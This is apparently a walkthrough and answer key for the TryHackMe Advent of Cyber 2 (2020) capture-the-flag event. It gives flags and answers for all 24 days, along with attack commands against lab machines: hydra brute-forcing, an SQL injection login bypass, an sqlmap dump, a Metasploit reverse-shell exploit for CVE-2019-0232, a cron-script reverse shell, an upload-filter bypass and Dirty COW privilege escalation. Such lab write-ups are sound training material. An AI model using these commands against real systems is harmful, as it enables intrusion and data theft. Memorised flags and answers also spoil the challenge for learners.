
# Advent Of Cyber 2 [2020]

## *[Day 1] Web Exploitation A Christmas Crisis*

- What is the name of the cookie used for authentication?

> auth

- In what format is the value of this cookie encoded?

> hexadecimal

- Having decoded the cookie, what format is the data stored in?

> JSON

- Figure out how to bypass the authentication. What is the value of Santa's cookie?

> 7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d

- Now that you are the santa user, you can re-activate the assembly line! What is the flag you're given when the line is fully active?

> THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}

---

## *[Day 2] Web Exploitation The Elf Strikes Back!*

- What string of text needs adding to the URL to get access to the upload page?

> ?id=ODIzODI5MTNiYmYw

- What type of file is accepted by the site?

> image

- Bypass the filter and upload a reverse shell. In which directory are the uploaded files stored?

To bypass the filter naming the file "rev-shell.png.php" is enough.

> /uploads/

- Activate your reverse shell and catch it in a netcat listener! What is the flag in /var/www/flag.txt?

> THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}

---

## *[Day 3] Web Exploitation Christmas Chaos*

- What is the flag?

```bash
# Find out the username
$ hydra -L day3-users.txt -p aaa 10.10.223.30 -V http-post-form "/login:username=^USER^&password=^PASS^:/?login=username_incorrect" -I

#Find out the password
$ hydra -l admin -P day3-pass.txt 10.10.223.30 -V http-post-form "/login:username=^USER^&password=^PASS^:/?login=password_incorrect" -I
```

> THM{885ffab980e049847516f9d8fe99ad1a}

---

## *[Day 4] Web Exploitation Santa's watching*

- Given the URL "http://shibes.xyz/api.php", what would the entire wfuzz command look like to query the "breed" parameter using the wordlist "big.txt" (assume that "big.txt" is in your current directory)
Note: For legal reasons, do not actually run this command as the site in question has not consented to being fuzzed!

> wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ

- Use GoBuster (against the target you deployed: not the shibes.xyz domain) to find the API directory. What file is there?

> site-log.php

- Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?

```bash
$ ./ffuf -u http://10.10.138.83/api/site-log.php?date=FUZZ -ic -t 5 -w ~/CTF/AdventOfCyber2/day4-dates -fs 0
```

> THM{D4t3_AP1}
---

## *[Day 5] Web Exploitation Someone stole Santa's gift list!*

- Without using directory brute forcing, what's Santa's secret login panel?

Just use the hint.

> /santapanel

### Visit Santa's secret login panel and bypass the login using SQLi

Use the following username: admin'-- -

- How many entries are there in the gift database?

Use the following paylload as "search": '-- -

Save them to file and count:

```bash
$ cat gifts.txt | wc -l
```

> 22

- What did Paul ask for?

> github ownership

- What is the flag?

To dump the database, use the following command:

```bash
$ sqlmap -u http://10.10.75.40:8000/santapanel?search= --dump --cookie='session=$YOUR_SESSION_COOKIE_GOES_HERE' --level=5 --risk=3
```

> thmfox{All_I_Want_for_Christmas_Is_You}

- What is admin's password?

> EhCNSWzzFP6sc7gB

---

## *[Day 6] Web Exploitation Be careful with what you wish on a Christmas night*

- What vulnerability type was used to exploit the application?

> stored crossite scripting

- What query string can be abused to craft a reflected XSS?

> q

- Run a ZAP (zaproxy) automated scan on the target. How many XSS alerts are in the scan?

![OWASP result](https://i.postimg.cc/05DSJ7GD/day6-owasp-zap.png)

> 2

---

## *[Day 7] Networking The Grinch Really Did Steal Christmas*

- Open "pcap1.pcap" in Wireshark. What is the IP address that initiates an ICMP/ping?

Use `icmp` as the filter and grab the 1st IP address.

> 10.11.3.2

- If we only wanted to see HTTP GET requests in our "pcap1.pcap" file, what filter would we use?

> http.request.method == GET

- Now apply this filter to "pcap1.pcap" in Wireshark, what is the name of the article that the IP address "10.10.67.199" visited?

Use the following filter: `http.request.method == GET && ip.src == 10.10.67.199`;
The article is under /posts/.

> reindeer-of-the-week

- Let's begin analysing "pcap2.pcap". Look at the captured FTP traffic; what password was leaked during the login process?

Use `ftp` as filter.

> plaintext_password_fiasco

- Continuing with our analysis of "pcap2.pcap", what is the name of the protocol that is encrypted?

In the toolbar, go to Statistics -> Protocol Hierarchy.

> ssh

Analyse "pcap3.pcap" and recover Christmas!

- What is on Elf McSkidy's wishlist that will be used to replace Elf McEager?

File -> Export Objects -> cristmas.zip

```bash
$ unzip cristmas.zip

$ cat christmas/elf_mcskidy_wishlist.txt
```

> Rubber ducky

---

## *[Day 8] Networking What's Under the Christmas Tree?*

- When was Snort created?

> 1998

- Using Nmap on 10.10.252.187 , what are the port numbers of the three services running?  (Please provide your answer in ascending order/lowest -> highest, separated by a comma)

> 80,2222,3389

- Use Nmap to determine the name of the Linux distribution that is running, what is reported as the most likely distribution to be running?

```bash
$ sudo nmap 10.10.252.187 -Pn -p- -A -vv -T4 --script discovery -oN nmap-scan --min-parallelism 55
```

> Ubuntu

- Use Nmap's Network Scripting Engine (NSE) to retrieve the "HTTP-TITLE" of the webserver. Based on the value returned, what do we think this website might be used for?

> blog

---

## *[Day 9] Networking Anyone can be Santa!*

- Question #1: Name the directory on the FTP server that has data accessible by the "anonymous" user

> public

- Question #2: What script gets executed within this directory?

> backup.sh

- Question #3: What movie did Santa have on his Christmas shopping list?

```bash
$ get shoppinglist.txt

$ cat shoppinglist.txt
```

> The Polar Express

- Question #4: Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt! Note that the script that we have uploaded may take a minute to return a connection. If it doesn't after a couple of minutes, double-check that you have set up a Netcat listener on the device that you are working from, and have provided the TryHackMe IP of the device that you are connecting from.

1. Start a netcat listener

2. Download backup.sh, add a [reverse shell from this GH repo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)
and put it back

3. Upgrade the shell:

```bash
$ python3 -c "import pty; pty.spawn('/bin/bash')"
```

> THM{even_you_can_be_santa}

---

## *[Day 10] Networking Don't be sElfish!*

```bash
$ perl enum4linux.pl -S -U 10.10.17.177
```

![result](https://i.postimg.cc/V6HCBFGW/day10-enum4linux.png)

- Question #1 Using enum4linux, how many users are there on the Samba server (MACHINE_IP)?

> 3

- Question #2 Now how many "shares" are there on the Samba server?

> 4

- Question #3 Use smbclient to try to login to the shares on the Samba server (MACHINE_IP). What share doesn't require a password?

> tbfc-santa

- Question #4 Log in to this share, what directory did ElfMcSkidy leave for Santa?

```bash
$ smbclient //10.10.17.177/tbfc-santa
```

> jingle-tunes

---

## *[Day 11] Networking The Rogue Gnome*

- What type of privilege escalation involves using a user account to execute commands as an administrator?

> vertical

- What is the name of the file that contains a list of users who are a part of the sudo group?

> sudoers

- What are the contents of the file located at /root/flag.txt?

privesc: `bash -p`

> thm{2fb10afe933296592}

---

## *[Day 12] Networking Ready, set, elf.*

```bash
$ sudo nmap 10.10.135.25 -Pn -p- -A -vv -T4 --script discovery,vuln -oN nmap-scan --min-parallelism 55
```

- What is the version number of the web server?

> 9.0.17

- What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)

> CVE-2019-0232

- What are the contents of flag1.txt

```bash
$ msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set rhosts 10.10.135.25

$ msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set lhost $ATTACKER_IP_GOES_HERE

$ msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set lport 8080

$ msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set payload windows/meterpreter/reverse_tcp

$ msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set targeturi /cgi-bin/elfwhacker.bat

$ msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > exploit
```

> thm{whacking_all_the_elves}

---

## *[Day 13] Special by John Hammond Coal for Christmas*

```bash
$ sudo nmap 10.10.143.8 -Pn -p- -A -vv -T4 --script discovery,vuln -oN nmap-scan --min-parallelism 55
```

- What old, deprecated protocol and service is running?

> telnet

- What credential was left for you?

> clauschristmas

- What distribution of Linux and version number is this server running?

```bash
$ cat /etc/*release
```

> Ubuntu 12.04

- Who got here first?

> grinch

- What is the verbatim syntax you can use to compile, taken from the real C source code comments?

> gcc -pthread dirty.c -o dirty -lcrypt

Download exploit from [ExploitDB](https://www.exploit-db.com/download/40839) and 
transfer it to the victim machine.

- What "new" username was created, with the default operations of the real C source code?

> firefart

- What is the MD5 hash output?

```bash
$ su firefart
$ cd /root
$ touch coal
$ tree | md5sum
```

> 8b16f00dd3b51efadb02c1df7f8427cc

---

## *[Day 14] Special by TheCyberMentor Where's Rudolph?*

- What URL will take me directly to Rudolph's Reddit comment history?

> https://www.reddit.com/user/IGuidetheClaus2020/comments/

- According to Rudolph, where was he born?

> Chicago

- Rudolph mentions Robert.  Can you use Google to tell me Robert's last name?

Search for "rudolf creator robert"

> May

- On what other social media platform might Rudolph have an account?

> twitter

- What is Rudolph's username on that platform?

> IGuideClaus2020

- What appears to be Rudolph's favorite TV show right now?

> Bachelorette

- Based on Rudolph's post history, he took part in a parade.  Where did the parade take place?

Use the 2 images of reindeer baloons to figure that out.

> chicago

- Okay, you found the city, but where specifically was one of the photos taken?

In twitter there's a link with a ["higher resolution"](https://tcm-sec.com/wp-content/uploads/2020/11/lights-festival-website.jpg)
Check EXIF metadata:

```bash
$ wget https://tcm-sec.com/wp-content/uploads/2020/11/lights-festival-website.jpg -O lights-festival-website.jpg

$ exiftool lights-festival-website.jpg
```

In google maps, search these coordinates:

```
41°53'30.53''N, 87°37'27.40''W
```

> 41.891815, -87.624277

- Did you find a flag too?

> {FLAG}ALWAYSCHECKTHEEXIFD4T4

- Has Rudolph been pwned? What password of his appeared in a breach?

First of all, the link in task is outdated: it's https://scylla.so/ now;
And second, I couldn't find any free services that allow you to see the cleartext
passwords of leaked databases. So just use the writeup

> spygame

- Based on all the information gathered.  It's likely that Rudolph is in the Windy City and is staying in a hotel on Magnificent Mile.  What are the street numbers of the hotel address?

> 540

---

## *[Day 15] Scripting There's a Python in my stocking!*

- What's the output of True + True?

> 2

- What's the database for installing other peoples libraries called?

> pypi

- What is the output of bool("False")?

> true

- What library lets us download the HTML of a webpage?

> requests

- What is the output of the program provided in "Code to analyse for Question 5" in today's material?

> [1, 2, 3, 6]

- What causes the previous task to output that?

> pass by reference

---

## *[Day 16] Scripting Help! Where is Santa?*

- What is the port number for the web server?

> 80

- Without using enumerations tools such as Dirbuster, what is the directory for the API?  (without the API key)

> /api/

- Where is Santa right now?

> Winter Wonderland, Hyde Park, London.

- Find out the correct API key. Remember, this is an odd number between 0-100. After too many attempts, Santa's Sled will block you. 

> 57

---

## *[Day 17] Reverse Engineering ReverseELFneering*

![day-17-program](https://i.postimg.cc/WbGwDwgt/day-17-challenge.png)

- What is the value of local_ch when its corresponding movl instruction is called (first if multiple)?

> 1

- What is the value of eax when the imull instruction is called?

> 6

- What is the value of local_4h before eax is set to 0?

> 6

---

## *[Day 18] Reverse Engineering The Bits of Christmas*

Navigate to CrackMe/MainForm

- What is Santa's password?

> santapassword321

- Now that you've retrieved this password, try to login...What is the flag?

> thm{046af}

---

## *[Day 19] Special by Tib3rius The Naughty or Nice List*

- What is Santa's password?

Visit this url: http://10.10.222.156/?proxy=http://list.hohoho.localtest.me

> Be good for goodness sake!

- What is the challenge flag?

Santa:Be good for goodness sake!

> THM{EVERYONE_GETS_PRESENTS}

---

## *[Day 20] Blue Teaming PowershELlF to the rescue*

- Search for the first hidden elf file within the Documents folder. Read the contents of this file. What does Elf 1 want?

```ps
Get-ChildItem -Path .\Documents\ -Hidden -Recurse -ErrorAction SilentlyContinue

Get-Content .\Documents\e1fone.txt
```

> 2 front teeth

- Search on the desktop for a hidden folder that contains the file for Elf 2. Read the contents of this file. What is the name of that movie that Elf 2 wants?

```ps
PS C:\Users\mceager\Desktop> Get-ChildItem -Path . -Hidden -Recurse -ErrorAction SilentlyContinue

PS C:\Users\mceager\Desktop> cd .\elf2wo\

PS C:\Users\mceager\Desktop\elf2wo> type .\e70smsW10Y4k.txt
```

> Scrooged

- Search the Windows directory for a hidden folder that contains files for Elf 3. What is the name of the hidden folder? (This command will take a while)

```ps
PS C:\Windows> Get-ChildItem -Path . -Hidden -Recurse -ErrorAction SilentlyContinue -Directory 
```

```
Directory: C:\Windows\System32

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--       11/23/2020   3:26 PM                3lfthr3e
d--h--       11/23/2020   2:26 PM                GroupPolicy
```

> 3lfthr3e

- How many words does the first file contain?

```ps
PS C:\Windows\System32\3lfthr3e> Get-Content .\1.txt | Measure-Object -Word

Lines Words Characters Property 
----- ----- ---------- --------
       9999

```

> 9999

- What 2 words are at index 551 and 6991 in the first file?

```ps
PS C:\Windows\System32\3lfthr3e> (Get-Content .\1.txt)[551]
Red
PS C:\Windows\System32\3lfthr3e> (Get-Content .\1.txt)[6991]
Ryder 
```

> Red Ryder

- This is only half the answer. Search in the 2nd file for the phrase from the previous question to get the full answer. What does Elf 3 want? (use spaces when submitting the answer)

```ps
PS C:\Windows\System32\3lfthr3e> Select-String -Path .\2.txt -Pattern 'redryder'

2.txt:558704:redryderbbgun 
```

> red ryder bb gun

---

## *[Day 21] Blue Teaming Time for some ELForensics*

- Read the contents of the text file within the Documents folder. What is the file hash for db.exe?

```ps
PS C:\Users\littlehelper\Documents> type '.\db file hash.txt'                           

Filename: db.exe
Md5 hash: 596690FFC54AB6101932856E6A78E3A1
```

> 596690FFC54AB6101932856E6A78E3A1

- What is the file hash of the mysterious executable within the Documents folder?

```ps
PS C:\Users\littlehelper\Documents> Get-FileHash .\deebee.exe -Algorithm md5
```

> 5F037501FB542AD2D9B06EB12AED09F0 

- Using Strings find the hidden flag within the executable?

```ps
PS C:\Users\littlehelper\Documents> Get-Item -Path .\deebee.exe -Stream *

PS C:\Users\littlehelper\Documents> c:\Tools\strings64.exe -accepteula .\deebee.exe
```

> THM{f6187e6cbeb1214139ef313e108cb6f9}

- What is the flag that is displayed when you run the database connector file?

```ps
PS C:\Users\littlehelper\Documents> wmic process call create $(Resolve-Path .\deebee.exe:hidedb)
```

> THM{088731ddc7b9fdeccaed982b07c297c}

---

## *[Day 22] Blue Teaming Elf McEager becomes CyberElf*

- What is the password to the KeePass database?

Decode directory name from base64

> thegrinchwashere

- What is the encoding method listed as the 'Matching ops'?

> base64

- What is the decoded password value of the Elf Server?

Find it under Networks and decode from hex

> sn0wM4n!

- What is the decoded password value for ElfMail?

Decode From HTML Entity

> ic3Skating!

- Decode the last encoded value. What is the flag?

Decode from decimal. You'll get a script, decode it's source and visit the link:

https://gist.github.com/heavenraiza/

> THM{657012dcf3d1318dca0ed864f0e70535}

---

## *[Day 23] Blue Teaming The Grinch strikes again!*

- Decrypt the fake 'bitcoin address' within the ransom note. What is the plain text value?

![note](https://i.postimg.cc/bYK9CV86/day23-ransom-note.png)

> nomorebestfestivalcompany

Next, we open a task scheduler and look for any suspicious cron jobs:

![task-scheduler](https://i.postimg.cc/Hs1dYHdb/day23-task-scheduler.png)

- At times ransomware changes the file extensions of the encrypted files. What is the file extension for each of the encrypted files?

Circle back to this one, after you assigned a letter to hidden partitition and
are able to view hidden directory contents.

> .grinch

- What is the name of the suspicious scheduled task?

> opidsfsdf/

- Inspect the properties of the scheduled task. What is the location of the executable that is run at login?

> C:\Users\Administrator\Desktop\opidsfsdf.exe

- There is another scheduled task that is related to VSS. What is the ShadowCopyVolume ID?

Click on the VSS task:

![vss task](https://i.postimg.cc/9MvRXSQz/day23-vss-task.png)

> 7a9eea15-0000-0000-0000-010000000000

- Assign the hidden partition a letter. What is the name of the hidden folder?

> confidential

- Right-click and inspect the properties for the hidden folder. Use the 'Previous Versions' tab to restore the encrypted file that is within this hidden folder to the previous version. What is the password within the file?

> m33pa55w0rdIZseecure!

---

## *[Day 24] Special by DarkStar The Trial Before Christmas*

- Scan the machine. What ports are open?

We'll start with our usual nmap scan:

```bash
$ sudo nmap 10.10.246.199 -Pn -p- -A -vv -T4 --script discovery,vuln -oN nmap-scan --min-parallelism 55
```

Select running services with

```bash
$ cat nmap-scan | grep -e '[0-9]\+/tcp[[:space:]].*' -o
```

We got 2 webservers:

[x] 80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))

[x] 65000/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))

> 80, 65000

Ok, let's take a look to enumeration results:

- port 80:

```
| http-vhosts: 
| 125 names had status 200
| ssl
|_server
```

- port 65000:

```
| http-vhosts: 
| 125 names had status 200
| smtp
|_apps
```

Add these lines to your ***hosts*** file:

```
10.10.246.199   ssl
10.10.246.199   server
10.10.246.199   smtp
10.10.246.199   apps
```

Also, create ***ports.txt*** file with following contents:

```
80
65000
```

and ***hosts.txt***:

```
ssl
server
smtp
apps
```

- What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step.

The report is available [here](https://0xf331-d3ad.github.io/CTF-ffuf-reports/tryhackme/AdventOfCyber2/day24/ffuf-report.html)

Browse through the report. Yu'll find the page at http://smtp:65000/

> Light Cycle

- What is the name of the hidden php page?

> /uploads.php

- What is the name of the hidden directory where file uploads are saved?

> grid

- What is the value of the web.txt flag?

To bypass the file uploading filter, just name the file ***shell.png.php***

> THM{ENTER_THE_GRID}

- Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password

> tron:IFightForTheUsers

- Access the database and discover the encrypted credentials. What is the name of the database you find these in?

> tron

- Crack the password. What is it?

> @computer@

- What is the value of the user.txt flag?

> THM{IDENTITY_DISC_RECOGNISED}

- Check the user's groups. Which group can be leveraged to escalate privileges? 

> lxd

- What is the value of the root.txt flag?

> THM{FLYNN_LIVES}

---

## *Thank you!*

> thm{thank_you_2020}

